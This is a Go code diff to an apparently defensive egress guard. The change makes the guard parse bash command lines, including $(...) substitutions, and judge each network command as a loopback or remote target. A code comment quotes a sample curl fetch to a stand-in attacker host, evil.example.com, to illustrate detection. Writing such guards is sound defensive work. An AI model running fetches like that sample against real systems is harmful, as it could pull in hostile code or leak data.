@@ -245,44 +245,53 @@ func extractEgressTargets(toolName string, args json.RawMessage) []egressTarget 
 
 // bashEgressTargets finds every network-capable command in a bash line.
 //
-// It walks the line with effectiveCommandWords — the same peel used by
-// IsHarmfulBashCommand — so a launcher does not hide the real binary
-// (`sudo env FOO=1 timeout 30 curl https://host/x` is judged as a curl). A
-// single fragment is judged on its own, exactly as isExfiltrationRiskBash
-// judges it, which means a line that mixes a loopback fetch with a remote one
-// (`curl http://127.0.0.1/ && curl https://evil.example.com/x`) is ONE
-// non-loopback target rather than two targets with mixed verdicts: the loopback
-// carve-out only applies when *every* target token is loopback, so the judge is
-// shown the whole line and the conservative answer stands.
+// It parses the whole line, including the commands inside $(...) substitutions,
+// and judges each command on its own with effectiveCommandWords — the same peel
+// used by IsHarmfulBashCommand — so a launcher does not hide the real binary
+// (`sudo env FOO=1 timeout 30 curl https://host/x` is judged as a curl). Each
+// network command is one target: `curl http://127.0.0.1/ && curl https://evil.example.com/x`
+// yields a loopback target and a remote one. The line is loopback only when
+// every target is, so hasNonLoopbackEgressTarget keeps the conservative answer.
 func bashEgressTargets(command string) []egressTarget {
 	command = strings.TrimSpace(command)
 	if command == "" {
 		return nil
 	}
+	// An unparseable line keeps the single-line split, so it does not lose the coverage it had before.
+	var fragments [][]string
+	if parsed, err := parseShellCommandLine(command); err == nil {
+		for _, cmd := range parsed {
+			fragments = append(fragments, cmd.cmdWords)
+		}
+	} else {
+		fragments = [][]string{splitShellFields(command)}
+	}
 	var out []egressTarget
-	for _, words := range effectiveCommandWords(splitShellFields(command)) {
-		if len(words) == 0 {
-			continue
+	for _, fragment := range fragments {
+		for _, words := range effectiveCommandWords(fragment) {
+			if len(words) == 0 {
+				continue
+			}
+			if !isNetworkSubprocessBinary(words[0]) {
+				continue
+			}
+			line := rebuildCommandLine(words)
+			host := bashEgressHost(words)
+			out = append(out, egressTarget{
+				Tool:  "bash",
+				Kind:  egressKindCommand,
+				Value: networkGuardClip(line),
+				Host:  host,
+				// The shared proofs, not a host comparison. Loopback here means "local
+				// network", not strictly this machine: a LAN host additionally needs a
+				// plain request, but a literal query or path on it can still carry data.
+				// Loopback is on-host whatever the request carries.
+				// Each proof requires no possible remote target and no
+				// connection-redirecting flag, so a proxied or --resolve'd "localhost"
+				// is correctly treated as remote.
+				Loopback: host != "" && (subprocessTargetsLocalhost(line) || subprocessTargetsLocalNetwork(line)),
+			})
 		}
-		if !isNetworkSubprocessBinary(words[0]) {
-			continue
-		}
-		line := rebuildCommandLine(words)
-		host := bashEgressHost(words)
-		out = append(out, egressTarget{
-			Tool:  "bash",
-			Kind:  egressKindCommand,
-			Value: networkGuardClip(line),
-			Host:  host,
-			// The shared proofs, not a host comparison. Loopback here means "local
-			// network", not strictly this machine: a LAN host additionally needs a
-			// plain request, but a literal query or path on it can still carry data.
-			// Loopback is on-host whatever the request carries.
-			// Each proof requires no possible remote target and no
-			// connection-redirecting flag, so a proxied or --resolve'd "localhost"
-			// is correctly treated as remote.
-			Loopback: host != "" && (subprocessTargetsLocalhost(line) || subprocessTargetsLocalNetwork(line)),
-		})
 	}
 	return out
 }
